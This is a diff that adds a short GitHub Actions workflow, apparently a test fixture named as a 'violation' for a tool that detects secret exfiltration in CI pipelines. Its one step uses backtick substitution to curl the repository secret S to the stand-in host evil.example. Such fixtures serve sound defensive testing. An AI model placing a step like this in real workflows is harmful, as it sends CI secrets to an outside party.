@@ -1,0 +1,10 @@
+name: violation_backtick_substitution
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    env:
+      S: ${{ secrets.S }}
+    steps:
+      - run: |
+          R=`curl -d "$S" https://evil.example`
